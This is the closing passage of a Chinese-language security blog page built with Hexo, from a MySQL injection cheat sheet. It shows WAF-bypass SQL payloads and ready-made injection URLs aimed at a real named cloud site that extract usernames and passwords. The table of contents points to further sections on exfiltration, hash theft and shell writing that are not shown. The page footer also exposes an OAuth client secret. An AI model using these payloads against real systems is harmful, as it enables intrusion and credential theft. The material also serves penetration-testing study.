class="line"><span class="keyword">select</span><span class="variable">@x</span> <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">!</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">!</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">select&#x27;</span>x<span class="string">&#x27; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&quot;]</span></span><br><span class="line"><span class="string">select&quot;x&quot; from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [~]</span></span><br><span class="line"><span class="string">select~x from y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># [&#123;&#125;]</span></span><br><span class="line"><span class="string">select&#123;xxx x&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125; from y</span></span><br><span class="line"><span class="string">select&#123;xxx `x`&#125;,.7from&#123;x `dbname`.`tablename`&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong><code>union select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># \N 绕过</span><br><span class="line"><span class="keyword">select</span> \N; # 代表<span class="keyword">null</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\N;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,\Nfrom users;</span><br><span class="line"></span><br><span class="line"># <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> 或 <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> 绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<p>云 WAF 绕过测试</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 阿里云防火墙</span><br><span class="line"># MYSQL</span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="keyword">union</span><span class="comment">/*^%a0&#123;\a|^!!&#125;*/</span><span class="comment">/*select|\*!??@@-- /*/</span><span class="operator">*</span><span class="comment">-- %26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 整形注入</span></span><br><span class="line">https:<span class="operator">/</span><span class="operator">/</span>edu.aliyun.com<span class="operator">/</span><span class="keyword">search</span>?q<span class="operator">=</span><span class="number">.8</span><span class="string">&#x27;|/*^ /*/* -- */1/*??@|@--  %0b%0a-- %0a*/union/*^%a0&#123;\a|^!!&#125;*//*select|\*!??@@--%20/*/*--%20%26%26^!~%*/select\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1-- # 字符型注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># MSSQL</span></span><br><span class="line"><span class="string">https://edu.aliyun.com/?id=1.8&#x27;</span><span class="keyword">union</span><span class="comment">--^!~%*/%0b/*%0aselect\N|!.7|1&amp;2%2%username,password from`finecms`.`fn_member` limit 1 offset 1)--</span></span><br></pre></td></tr></table></figure>
<p><img src="/../../../.gitbook/assets/c9b31b5011e96ee6bdd2c5bd10e08dc3258e535f34655ed4e4ab54cdfd646253.png">  </p>
<h3 id="MySQL-history"><a href="#MySQL-history" class="headerlink" title="MySQL history"></a>MySQL history</h3><p>You ca see other executions inside the MySQL reading the table: <strong>sys.x$statement_analysis</strong></p>
<h3 id="Version-alternatives"><a href="#Version-alternatives" class="headerlink" title="Version alternatives"></a>Version alternative<strong>s</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@innodb_version;</span><br><span class="line">+------------------+</span><br><span class="line">| @@innodb_version |</span><br><span class="line">+------------------+</span><br><span class="line">| 5.6.31           |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-------------------------+</span><br><span class="line">| @@version               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select version();</span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 5.6.31-0ubuntu0.15.10.1 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/" rel="prev" title="Reverse Tab Nabbing（反向标签劫持）">
      <i class="fa fa-chevron-left"></i> Reverse Tab Nabbing（反向标签劫持）
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/05/04/%E8%B7%A8%E7%AB%99%E6%90%9C%E7%B4%A2%E6%94%BB%E5%87%BB/" rel="next" title="跨站搜索攻击">
      跨站搜索攻击 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL-injection"><span class="nav-number">1.</span> <span class="nav-text">MySQL injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="nav-number">1.2.</span> <span class="nav-text">空白字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB"><span class="nav-number">1.3.</span> <span class="nav-text">MySQL 注入常用函数汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%BA-Mysql-%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.1.</span> <span class="nav-text">确认数据库类型为 Mysql 的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8-%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.2.</span> <span class="nav-text">MySQL 注入使用 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E9%80%82%E7%94%A8-Payload"><span class="nav-number">1.4.</span> <span class="nav-text">全适用 Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">1.5.</span> <span class="nav-text">Mysql 注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Only-1-value"><span class="nav-number">1.5.1.</span> <span class="nav-text">Only 1 value</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-one-by-one"><span class="nav-number">1.5.2.</span> <span class="nav-text">Blind one by one</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-adding"><span class="nav-number">1.5.3.</span> <span class="nav-text">Blind adding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Detect-number-of-columns-amp-x20"><span class="nav-number">1.6.</span> <span class="nav-text">Detect number of columns&amp;#x20;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-Union-Based"><span class="nav-number">1.7.</span> <span class="nav-text">MySQL Union Based</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Error-Based"><span class="nav-number">1.8.</span> <span class="nav-text">MYSQL Error Based</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Error-Based-Basic"><span class="nav-number">1.8.1.</span> <span class="nav-text">MYSQL Error Based - Basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Error-Based-UpdateXML-function"><span class="nav-number">1.8.2.</span> <span class="nav-text">MYSQL Error Based - UpdateXML function</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Error-Based-Extractvalue-function"><span class="nav-number">1.8.3.</span> <span class="nav-text">MYSQL Error Based - Extractvalue function</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Error-Based-NAME-CONST-function-only-for-constants"><span class="nav-number">1.8.4.</span> <span class="nav-text">MYSQL Error Based - NAME_CONST function (only for constants)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Blind"><span class="nav-number">1.9.</span> <span class="nav-text">MYSQL Blind</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Blind-with-substring-equivalent"><span class="nav-number">1.9.1.</span> <span class="nav-text">MYSQL Blind with substring equivalent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-Blind-SQL-Injection-in-ORDER-BY-clause-using-a-binary-query-and-REGEXP"><span class="nav-number">1.9.2.</span> <span class="nav-text">MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-Blind-SQL-Injection-binary-query-using-REGEXP"><span class="nav-number">1.9.3.</span> <span class="nav-text">MySQL Blind SQL Injection binary query using REGEXP.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Blind-using-a-conditional-statement"><span class="nav-number">1.9.4.</span> <span class="nav-text">MYSQL Blind using a conditional statement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Blind-with-MAKE-SET"><span class="nav-number">1.9.5.</span> <span class="nav-text">MYSQL Blind with MAKE_SET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL-Blind-with-LIKE"><span class="nav-number">1.9.6.</span> <span class="nav-text">MYSQL Blind with LIKE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Time-Based"><span class="nav-number">1.10.</span> <span class="nav-text">MYSQL Time Based</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-SLEEP-in-a-subselect"><span class="nav-number">1.10.1.</span> <span class="nav-text">Using SLEEP in a subselect</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Using-conditional-statements"><span class="nav-number">1.10.2.</span> <span class="nav-text">Using conditional statements</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-DIOS-Dump-in-One-Shot"><span class="nav-number">1.11.</span> <span class="nav-text">MYSQL DIOS - Dump in One Shot</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Current-queries"><span class="nav-number">1.12.</span> <span class="nav-text">MYSQL Current queries</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Read-content-of-a-file"><span class="nav-number">1.13.</span> <span class="nav-text">MYSQL Read content of a file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Write-a-shell"><span class="nav-number">1.14.</span> <span class="nav-text">MYSQL Write a shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Into-outfile-method"><span class="nav-number">1.14.1.</span> <span class="nav-text">Into outfile method</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Into-dumpfile-method"><span class="nav-number">1.14.2.</span> <span class="nav-text">Into dumpfile method</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-Fast-Exploitation"><span class="nav-number">1.15.</span> <span class="nav-text">MYSQL Fast Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL-UDF-command-execution"><span class="nav-number">1.16.</span> <span class="nav-text">MYSQL UDF command execution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL-Out-of-band"><span class="nav-number">2.</span> <span class="nav-text">MYSQL Out of band</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-exfiltration"><span class="nav-number">2.0.1.</span> <span class="nav-text">DNS exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UNC-Path-NTLM-hash-stealing"><span class="nav-number">2.0.2.</span> <span class="nav-text">UNC Path - NTLM hash stealing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">2.1.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF-bypass-tricks"><span class="nav-number">2.2.</span> <span class="nav-text">WAF bypass tricks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-schema-alternatives"><span class="nav-number">2.2.1.</span> <span class="nav-text">Information_schema alternatives</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQLinjection-without-COMMAS"><span class="nav-number">2.2.2.</span> <span class="nav-text">MySQLinjection without COMMAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Extract-columns-name-without-information-schema"><span class="nav-number">2.2.3.</span> <span class="nav-text">Extract columns name without information_schema</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Retrieving-values-without-the-column-name"><span class="nav-number">2.2.4.</span> <span class="nav-text">Retrieving values without the column name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.5.</span> <span class="nav-text">通用绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-history"><span class="nav-number">2.2.6.</span> <span class="nav-text">MySQL history</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Version-alternatives"><span class="nav-number">2.2.7.</span> <span class="nav-text">Version alternatives</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">sing</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">33</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sing</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '6e8bfc081de57f042466',
      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
      repo        : 'sing3r.github.io',
      owner       : 'sing3r',
      admin       : ['sing3r'],
      id          : '1776dd19e8dc678636ea23e90d049eb7',
        language: '',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
